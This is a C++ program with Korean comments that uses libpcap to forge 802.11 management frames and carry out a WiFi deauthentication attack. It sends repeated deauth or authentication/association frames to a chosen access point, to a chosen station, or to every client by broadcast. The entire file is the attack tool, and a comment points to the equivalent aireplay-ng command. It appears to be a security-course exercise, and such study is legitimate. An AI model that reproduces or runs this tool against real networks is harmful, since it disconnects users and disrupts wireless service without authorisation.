#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <iomanip>
#include "mac_address.h"

#define DEAUTH 0x0b
#define AUTH 0x0c
#define AUSSO 0x00

using namespace std;

#pragma pack(push, 1)

// Radiotap Header (간단 버전)
struct RadiotapHeader {
    uint8_t  version;    // 항상 0
    uint8_t  pad;
    uint16_t length;     // 전체 Radiotap 헤더 길이
    uint32_t present;    // 필드 존재 여부 비트마스크
};

struct Frame80211 {
    uint8_t version : 2;  // 프로토콜 버전
    uint8_t type : 2;     // 프레임 타입(Management/Data/Control)
    uint8_t subtype : 4;  // 서브타입(Beacon 등)
    uint8_t flags; 
    uint16_t duration;
    MacAddress address1;       // 수신 대상 (일반적으로 Broadcast: ff:ff:ff:ff:ff:ff)
    MacAddress address2;       // 송신자 MAC
    MacAddress address3;       // BSSID
    uint16_t sequence_control;
};

// 간단한 사용법 출력
void usage() {
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

// 패킷 생성 함수
void make_packet(uint8_t* packet, const MacAddress& src_mac, const MacAddress& dest_mac, uint8_t subtype) {
    // Radiotap Header 설정
    RadiotapHeader rth;
    memset(&rth, 0, sizeof(rth));
    rth.version = 0;
    rth.pad = 0;
    rth.length = sizeof(RadiotapHeader);
    rth.present = 0;

    // Frame80211 설정
    Frame80211 deauth_frame{};
    deauth_frame.version = 0; // Protocol version
    deauth_frame.type = 0;    // Management frame
    deauth_frame.subtype = subtype; // Subtype (Deauthentication)
    deauth_frame.flags = 0;   // Default flags
    deauth_frame.duration = 0; // Default duration
    deauth_frame.address1 = dest_mac;
    deauth_frame.address2 = src_mac;
    deauth_frame.address3 = src_mac;
    deauth_frame.sequence_control = 0; // Default sequence control

    // Fixed Parameters 설정
    uint8_t fixed_params[12] = {0x00, 0x07};

    // 패킷 구성
    size_t offset = 0;

    // Radiotap Header 복사
    memcpy(packet + offset, &rth, sizeof(rth));
    offset += sizeof(rth);

    // 802.11 Frame Header 복사
    memcpy(packet + offset, &deauth_frame, sizeof(deauth_frame));
    offset += sizeof(deauth_frame);

    // Fixed Parameters 복사
    memcpy(packet + offset, fixed_params, sizeof(fixed_params));
}

// aireplay-ng wlan -c 10 -a <AP address>

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 5) {
        std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
        return EXIT_FAILURE;
    }

    char* interface = argv[1];              // 인터페이스 (ex. mon0)
    MacAddress ap_mac = parse_mac(argv[2]);

    MacAddress station_mac{};
    bool has_station_mac = false;
    bool deauth_or_auth = false; // false = deauth, true = auth
    // option parsing
    if (argc >= 4) {
        has_station_mac = true;
        station_mac = parse_mac(argv[3]);

        if (argc == 5 && strcmp(argv[4], "-auth") == 0) {
            deauth_or_auth = true;
        }
    }
    //==================================================================//

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
        return -1;
    }


    if (has_station_mac){
        uint8_t packet[256];
        uint8_t packet2[256];
        if (deauth_or_auth){//authentication attack
            make_packet(packet, station_mac, ap_mac, AUTH);
            make_packet(packet2, station_mac, ap_mac,  AUSSO);
        } else { //deautentication attack
            make_packet(packet, ap_mac, station_mac, DEAUTH);
            make_packet(packet2, station_mac, ap_mac, DEAUTH);
        }
        for (int i=0;i< 20;i++){
            // 패킷 전송
            if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
            }
            usleep(10000); 
            if (pcap_sendpacket(pcap, packet2, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
            }
            usleep(10000); 
        }
    } else {//Just Broadcast Deauth
        uint8_t packet[256];
        make_packet(packet, ap_mac, make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff), 0x0b );
        for (int i=0;i< 20;i++){
        // 패킷 전송
        if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
        }
        usleep(10000); }
    }
    pcap_close(pcap);

    return 0;
}